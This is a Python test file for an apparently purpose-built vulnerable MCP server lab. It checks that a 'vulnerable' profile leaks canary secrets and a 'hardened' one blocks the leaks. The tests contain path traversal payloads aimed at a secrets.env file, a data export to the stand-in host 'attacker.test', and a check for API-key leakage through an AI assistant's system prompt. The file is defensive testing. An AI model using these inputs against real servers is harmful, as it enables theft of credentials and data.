from __future__ import annotations

from typing import Any

import anyio
from langchain_core.messages import AIMessage
from mcp.client.client import Client

from targets.lab.canary import secrets_for
from targets.lab.profile import Profile
from targets.mcp_server.server import build_server
from tests.lab.conftest import ScriptedModel


def _text(result: Any) -> str:
    return "\n".join(getattr(c, "text", "") for c in result.content)


def _call(
    profile: Profile, tool: str, args: dict[str, Any], model: ScriptedModel | None = None
) -> str:
    server, _, _ = build_server(profile=profile, model=model, target_name="t-mcp")

    async def go() -> str:
        async with Client(server) as c:
            return _text(await c.call_tool(tool, args))

    return anyio.run(go)


def test_path_traversal(vulnerable: Profile, hardened: Profile) -> None:
    s = secrets_for("t-mcp")
    for path in (
        "../config/secrets.env",
        "/config/secrets.env",
        "projects/../../config/secrets.env",
    ):
        assert s.api_key in _call(vulnerable, "read_file", {"path": path})
        assert "Access denied" in _call(hardened, "read_file", {"path": path})
    assert "Bozeman" in _call(
        hardened, "read_file", {"path": "projects/../projects/store-openings.md"}
    )


def test_settings_resource(vulnerable: Profile, hardened: Profile) -> None:
    s = secrets_for("t-mcp")

    async def read(p: Profile) -> str:
        server, _, _ = build_server(profile=p, target_name="t-mcp")
        async with Client(server) as c:
            res = await c.read_resource("config://settings")
            return str(getattr(res.contents[0], "text", ""))

    assert s.api_key in anyio.run(read, vulnerable)
    assert s.api_key not in anyio.run(read, hardened)


def test_export_allowlist(vulnerable: Profile, hardened: Profile, net: list[Any]) -> None:
    assert "Exported" in _call(
        vulnerable, "export_notes", {"destination_url": "http://attacker.test/x"}
    )
    assert "refused" in _call(
        hardened, "export_notes", {"destination_url": "http://attacker.test/x"}
    )
    ok = _call(hardened, "export_notes", {"destination_url": "http://backup.harborview.test/n"})
    assert "Exported" in ok
    assert [u for _, u in net] == ["http://attacker.test/x", "http://backup.harborview.test/n"]


def test_ask_assistant_prompt_and_redaction(vulnerable: Profile, hardened: Profile) -> None:
    s = secrets_for("t-mcp")
    m = ScriptedModel(script=[AIMessage(f"key {s.api_key}")])
    assert s.api_key in _call(vulnerable, "ask_assistant", {"question": "inventory?"}, m)
    assert s.api_key in m.system_prompt()
    m = ScriptedModel(script=[AIMessage(f"key {s.api_key}")])
    assert "[REDACTED]" in _call(hardened, "ask_assistant", {"question": "inventory?"}, m)
    prompt = m.system_prompt()
    assert s.api_key not in prompt and s.system_canary in prompt and "<<<UNTRUSTED" in prompt


def test_notes_roundtrip(vulnerable: Profile) -> None:
    server, ws, log = build_server(profile=vulnerable, target_name="t-mcp")

    async def go() -> str:
        async with Client(server) as c:
            await c.call_tool("add_note", {"title": "Parking", "body": "Lot B", "author": "x"})
            return _text(await c.call_tool("search_notes", {"query": "parking"}))

    assert "Lot B" in anyio.run(go)
    assert [e.name for e in log.list()] == ["add_note", "search_notes"]
    ws.reset()
    assert len(ws.notes) == 5
